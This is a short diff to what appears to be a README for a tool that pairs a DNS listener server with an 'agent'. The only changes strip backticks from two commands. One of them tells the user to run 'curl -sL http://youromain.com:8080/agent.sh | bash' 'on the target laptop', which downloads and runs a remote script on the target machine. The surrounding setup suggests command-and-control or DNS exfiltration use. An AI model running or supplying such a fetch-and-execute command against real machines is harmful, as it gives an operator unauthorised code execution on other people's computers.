@@ -49,7 +49,7 @@ pip3 install dnslib flask
 ## RUN THE DNS LISTENER
 ```bash
 cd server
-`sudo python3 dnslistener.py`
+sudo python3 dnslistener.py
 ```
 (Leave it running in the background or use `tmux`.)
 
@@ -64,7 +64,7 @@ cd server
 - On the target laptop, execute:
 - ON LAPTOP EXECUTE....
 ```bash
-`curl -sL http://youromain.com:8080/agent.sh | bash`
+curl -sL http://youromain.com:8080/agent.sh | bash
 ```
 
 
